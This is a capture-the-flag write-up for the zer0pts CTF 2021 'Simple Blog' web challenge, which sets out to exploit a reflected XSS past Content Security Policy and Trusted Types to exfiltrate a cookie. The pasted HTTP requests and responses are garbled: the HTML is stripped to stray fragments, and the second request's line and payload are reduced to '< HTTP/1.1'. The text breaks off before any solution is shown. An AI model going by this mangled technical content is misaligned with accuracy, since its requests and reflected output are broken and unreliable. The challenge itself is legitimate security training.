@@ -1,0 +1,109 @@
+zer0pts CTF 2021 – Simple Blog
+
+Category: web
+Points: 192
+
+Challenge
+
+Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?
+http://web.ctf.zer0pts.com:8003/
+author:st98
+
+Solution
+The challenge gives you an attachment containing the source code. The most important files are index.php and api.php.
+Analyzing the website, you can discover the following message under the "Report Vulnerability" section.
+
+If you find a vulnerability in my blog platform, please report a Proof of Concept that exfiltrates document.cookie to me. I will check the URL with Mozilla Firefox later.
+I only accept reports under /index.php, so please submit only GET paremeters. For example, if the URL you want to submit is http://example.com/index.php?theme=light, please submit only theme=light part.
+
+So, given this message and the challenge description, it's pretty obvious that the target of the challenge is to exploit some sort of Reflected XSS.
+The website allows the possibility to change the theme via a URL parameter.
+Passing a value for the theme parameter will reflect the passed value in some parts of the webpage.
+```
+GET /?theme=foo HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:17:41 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 2957
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+
+
+Simple Blog
+
+
+
+
+
+
+
+Simple Blog
+
+Report Vulnerability
+
+
+Toggle theme
+
+
+
+
+
+Loading...
+
+
+
+< HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:19:19 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 3065
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+
+
+Simple Blog
+
+<.min.css">
+    
+
+
+
+< bg-dark.min.css"><">
+        Simple Blog
+
+Report Vulnerability
+
+
+Toggle theme
+
+
+
+
+
+Loading...
+
+
+
+
